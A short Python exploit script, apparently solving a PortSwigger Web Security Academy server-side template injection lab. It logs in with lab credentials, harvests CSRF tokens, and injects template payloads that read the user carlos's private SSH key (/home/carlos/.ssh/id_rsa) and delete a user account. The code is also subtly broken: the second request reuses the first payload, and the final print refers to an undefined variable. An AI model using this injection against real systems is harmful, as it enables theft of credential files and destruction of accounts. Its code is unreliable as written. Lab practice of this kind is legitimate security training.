import requests
from bs4 import BeautifulSoup

url = "https://ac3f1f0f1f9a8dbfc0750894000700a4.web-security-academy.net"

def  get_csrf(text):
	soup = BeautifulSoup(text, "html.parser")
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			csrf = i.get('value')
	return csrf

def slove(url):
	s = requests.session()

	r1 = s.get(url+"/login")
	c1 = get_csrf(r1.text)

	data = {"csrf": c1, "username": "wiener", "password" :"peter"}
	r2 = s.post(url+"/login", data=data)
	c2 = get_csrf(r2.text)

	payload1 = r"user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')"
	data2 = {"blog-post-author-display": payload1 , "csrf" : c2} 
	exploit1 = s.post(url + "/my-account/change-blog-post-author-display", data=data2 )

	payload2 = r"user.gdprDelete()"
	data2 = {"blog-post-author-display": payload1 , "csrf" : c2} 
	exploit2 = s.post(url + "/my-account/change-blog-post-author-display", data=data2 )

	

	print(exploit)

slove(url)